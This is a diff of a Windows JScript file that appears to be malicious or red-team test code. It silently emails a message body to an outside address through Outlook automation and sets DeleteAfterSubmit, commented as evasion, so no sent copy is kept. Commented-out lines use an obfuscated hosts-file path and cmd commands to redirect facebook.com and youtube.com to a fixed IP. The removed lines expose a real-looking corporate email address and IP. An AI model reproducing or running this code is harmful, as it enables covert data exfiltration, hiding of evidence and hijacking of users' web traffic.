@@ -36,7 +36,7 @@ try {
     var outlookApp = new ActiveXObject("Outlook.Application");
     var mailItem = outlookApp.CreateItem(0); 
 
-    mailItem.To = "jfrobles@palawanpawnshop.com";
+    mailItem.To = "asdf@gmail.com";
     mailItem.Subject = "Test- Hi Im Compromised";
     mailItem.Body = messageBody;
 	mailItem.DeleteAfterSubmit = true; //for defensive evansion
@@ -44,8 +44,8 @@ try {
     mailItem.Send();
 
 	//var h = String.fromCharCode(67, 58, 92, 87, 105, 110, 100, 111, 119, 115, 92, 83, 121, 115, 116, 101, 109, 51, 50, 92, 100, 114, 105, 118, 101, 114, 115, 92, 101, 116, 99, 92, 104, 111, 115, 116, 115);
-	//var r1 = "210.213.82.181 facebook.com";
-    //var r2 = "210.213.82.181 youtube.com";
+	//var r1 = "30.2.2.1 facebook.com";
+    //var r2 = "30.2.2.1 youtube.com";
 	//var inject1 = "cmd /c echo " + r1 + " >> " + h;
     //var inject2 = "cmd /c echo " + r2 + " >> " + h;
 	//shell.Run(inject1, 0, true);
@@ -63,4 +63,5 @@ try {
 	}
 } catch (e) {
     WScript.Echo("Critical Error: " + e.description);
+
 }
